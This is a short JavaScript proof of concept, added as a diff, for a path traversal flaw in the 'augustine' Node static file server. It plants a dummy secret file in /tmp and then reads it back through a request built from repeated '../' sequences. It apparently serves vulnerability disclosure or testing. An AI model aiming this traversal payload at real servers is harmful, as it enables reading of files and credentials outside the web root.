@@ -1,0 +1,37 @@
+```javascript
+// Path Traversal in "augustine" static file server
+// index.js takes url.parse(req.url).pathname, strips the leading "/",
+// and passes it straight to path.resolve() with NO check that the
+// resolved path stays inside the intended web root. A client can send
+// "../" sequences to escape the served directory and read arbitrary
+// files from the filesystem.
+
+const fs = require("fs");
+const http = require("http");
+const augustine = require("./node_modules/augustine");
+
+// A file that lives outside whatever directory augustine intends to serve.
+const secretPath = "/tmp/secret_outside_webroot.txt";
+fs.writeFileSync(secretPath, "SECRET_DB_PASSWORD=hunter2");
+
+const PORT = 4326;
+augustine.start(PORT); // note: start(port, cb) does NOT invoke cb as a ready-callback
+
+setTimeout(() => {
+  // Escape the web root (cwd) all the way up to "/", then dive into /tmp
+  const traversalPath = "/" + "../".repeat(10) + "tmp/secret_outside_webroot.txt";
+
+  http.get({ host: "127.0.0.1", port: PORT, path: traversalPath }, (res) => {
+    let body = "";
+    res.on("data", (chunk) => (body += chunk));
+    res.on("end", () => {
+      console.log(`GET ${traversalPath} -> ${res.statusCode}`);
+      console.log("Leaked file contents:", body);
+      process.exit(0);
+    });
+  }).on("error", (e) => {
+    console.error("Request failed:", e);
+    process.exit(1);
+  });
+}, 500);
+```
